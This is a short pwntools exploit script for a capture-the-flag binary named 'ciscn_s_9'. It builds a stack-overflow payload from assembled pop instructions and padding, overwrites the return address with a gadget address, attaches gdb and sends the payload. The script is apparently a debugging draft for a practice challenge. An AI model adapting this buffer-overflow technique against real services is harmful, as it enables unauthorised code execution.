from pwn import *
p=process('./ciscn_s_9')
elf=ELF('./ciscn_s_9')
libc=ELF('/home/cc/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
p.recvuntil(b'>\n')
context.arch='i386'
hint_addr=0x08048551
pop_ebp=0x08048557
pop_ebx=0x08048359
payload=asm('''
            pop edi
            pop edi
            pop edi
            ''')
payload+=(32-len(payload))*b'a'
payload+=p32(0xffff000)
payload+=p32(hint_addr)
gdb.attach(p,'b *0x08048542')
p.send(payload)
p.interactive()